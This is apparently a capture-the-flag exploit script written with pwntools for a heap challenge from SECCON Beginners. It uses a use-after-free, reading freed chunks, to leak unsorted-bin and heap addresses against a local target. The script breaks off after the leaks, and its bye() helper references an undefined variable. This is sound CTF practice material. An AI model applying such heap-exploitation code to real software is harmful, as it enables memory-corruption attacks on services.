from pwn import *

context.arch = "amd64"
elf_file = FILENAME = 'chall'
e = elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log


'''
HOST = 'monkey.quals.beginners.seccon.jp'
POST = 9999
libc = ELF("./libc.so.6")
'''
HOST = 'localhost'
POST = 9999
libc = ELF("./libc.so.6")
#libc = ELF("./libc6-amd64_2.27-3ubuntu1_i386/data/lib64/libc.so.6")
c = remote(HOST, POST)

def add(index,size):
  c.sendlineafter("> ",'1')
  c.sendlineafter("index: ",str(index))
  c.sendlineafter("size: ",str(size))

def write(index,data):
  c.sendlineafter("> ",'2')
  c.sendlineafter("index: ",str(index))
  c.sendlineafter("data: ",str(data))

def read(index,num):
  c.sendlineafter("> ",'3')
  c.sendlineafter("index ",str(index))
  c.recvuntil("papyrus: ")
  return c.recv(num)

def burn(index):
  c.sendlineafter("> ",'4')
  c.sendlineafter("index: ",str(index))#not free pointer

def bye():
  s.sendlineafter("> ", "5")



add(0,0x500)
add(1,0x500)
add(2,0x500)
add(3,0x500)

burn(0)#connect unsorted bin
burn(2)#connect heap

unsorted = u64(read(0,6).ljust(8,'\x00'))
heap = u64(read(0,6).ljust(8,'\x00'))
c.interactive()